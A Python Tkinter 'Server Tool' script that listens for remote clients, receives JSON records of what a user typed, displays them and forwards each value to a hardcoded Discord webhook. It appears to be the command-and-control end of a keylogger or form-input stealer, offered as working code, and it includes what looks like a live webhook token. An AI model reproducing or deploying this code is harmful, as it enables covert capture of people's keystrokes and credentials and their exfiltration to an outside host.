import socket
import threading
import requests
from tkinter import Tk, Label, Button, Text, Scrollbar, StringVar, END, DISABLED, NORMAL
import logging
import json

# Logging configuration
logging.basicConfig(
    filename="server.log",
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Server configuration
SERVER_IP = "0.0.0.0"  # Listen on all network interfaces
SERVER_PORT = 5555
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1068936615348666430/wOz8SkAqncHL8yvu2jGoBu159a8ANEdnpVLg_3IdfokRv3n2ybNJXUnbZYeEcqocuQJt"  # Replace with your webhook URL

# Global variables
server_socket = None
server_running = False
connected_clients = {}  # Track active client connections


def send_to_discord(message):
    """Send a message to a Discord webhook."""
    if not DISCORD_WEBHOOK_URL.startswith("https://discord.com/api/webhooks/"):
        logging.warning("Discord webhook URL is not configured correctly.")
        return
    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json={"content": message})
        if response.status_code == 204:
            logging.info("Message sent to Discord successfully.")
        else:
            logging.error(f"Failed to send message to Discord. Status code: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending message to Discord: {e}")


def handle_client(client_socket, client_address, log_text):
    """Handle communication with a connected client."""
    global connected_clients

    # Prevent duplicate handling of the same client
    if client_address in connected_clients:
        return

    connected_clients[client_address] = client_socket
    logging.info(f"Connection established with {client_address}")
    log_text.insert(END, f"🔗 Connection established with {client_address}\n")
    send_to_discord(f"🔗 Connection established with {client_address}")

    try:
        while True:
            data = client_socket.recv(1024).decode()
            if not data:  # Client disconnected
                break

            # Parse incoming data
            try:
                json_data = json.loads(data)
                if "field" in json_data and "value" in json_data:
                    # Log and display the received data
                    value = json_data["value"]
                    log_text.insert(END, f"📝 User typed: {value}\n")
                    send_to_discord(f"📝 User typed: {value}")
                    logging.info(f"Received: {value}")
            except json.JSONDecodeError as e:
                log_text.insert(END, f"Error parsing data: {e}\n")
                logging.error(f"Error parsing data: {e}")

    except Exception as e:
        log_text.insert(END, f"Connection error: {e}\n")
        logging.error(f"Error with client {client_address}: {e}")
    finally:
        if client_address in connected_clients:
            connected_clients.pop(client_address)
        logging.info(f"Connection closed with {client_address}")
        log_text.insert(END, f"❌ Connection closed with {client_address}\n")
        send_to_discord(f"❌ Connection closed with {client_address}")
        client_socket.close()


def accept_clients(log_text):
    """Accept clients in a loop."""
    global server_socket, server_running

    while server_running:
        try:
            client_socket, client_address = server_socket.accept()
            threading.Thread(target=handle_client, args=(client_socket, client_address, log_text), daemon=True).start()
        except OSError:
            if server_running:
                log_text.insert(END, "Error accepting client connection.\n")
                logging.error("Error accepting client connection.")
            break


def start_server(server_status, log_text, start_button, stop_button):
    """Start the server to handle incoming connections."""
    global server_socket, server_running, connected_clients

    # Create a socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow address reuse

    try:
        server_socket.bind((SERVER_IP, SERVER_PORT))
        server_socket.listen(5)
        server_running = True
        server_status.set("Server Running...")
        log_text.insert(END, "Server is listening for connections...\n")
        logging.info(f"Server started on {SERVER_IP}:{SERVER_PORT}")
        start_button.config(state=DISABLED)
        stop_button.config(state=NORMAL)
    except OSError as e:
        log_text.insert(END, f"Error: {e}\n")
        logging.error(f"Error starting server: {e}")
        server_socket.close()
        return

    threading.Thread(target=accept_clients, args=(log_text,), daemon=True).start()


def stop_server(server_status, log_text, start_button, stop_button):
    """Stop the server."""
    global server_socket, server_running, connected_clients

    if server_running:
        server_running = False
        for client in connected_clients.values():
            try:
                client.close()
            except Exception as e:
                logging.error(f"Error closing client socket: {e}")
        connected_clients.clear()

        try:
            server_socket.close()
            logging.info("Server socket closed.")
        except Exception as e:
            logging.error(f"Error closing server socket: {e}")
        server_status.set("Server Stopped.")
        log_text.insert(END, "Server has been stopped.\n")
        send_to_discord("🚫 Server has been stopped.")
        logging.info("Server stopped.")
        log_text.delete("1.0", END)
        start_button.config(state=NORMAL)
        stop_button.config(state=DISABLED)


def start_server_gui():
    """Create the GUI for the server."""
    app = Tk()
    app.title("Server Tool")
    app.geometry("600x400")
    app.configure(bg="#1E1E1E")

    server_status = StringVar()
    server_status.set("Server Stopped.")

    Label(app, text="Server Tool", font=("Arial", 18, "bold"), fg="#FFFFFF", bg="#1E1E1E").pack(pady=10)

    start_button = Button(
        app, text="Start Server", font=("Arial", 12), bg="#2ECC71", fg="#FFFFFF", relief="flat",
        command=lambda: threading.Thread(
            target=start_server, args=(server_status, log_text, start_button, stop_button), daemon=True).start()
    )
    start_button.pack(pady=5)

    stop_button = Button(
        app, text="Stop Server", font=("Arial", 12), bg="#E74C3C", fg="#FFFFFF", relief="flat", state=DISABLED,
        command=lambda: stop_server(server_status, log_text, start_button, stop_button)
    )
    stop_button.pack(pady=5)

    Label(app, textvariable=server_status, font=("Arial", 12), fg="#F1C40F", bg="#1E1E1E").pack(pady=5)

    global log_text
    log_text = Text(app, wrap="word", height=15, bg="#2C2C2C", fg="#FFFFFF", insertbackground="#FFFFFF", relief="flat")
    log_text.pack(pady=10, padx=10, fill="both", expand=True)

    scrollbar = Scrollbar(app)
    scrollbar.pack(side="right", fill="y")
    scrollbar.config(command=log_text.yview)
    log_text.config(yscrollcommand=scrollbar.set)

    app.mainloop()


if __name__ == "__main__":
    logging.info("Starting server GUI...")
    start_server_gui()
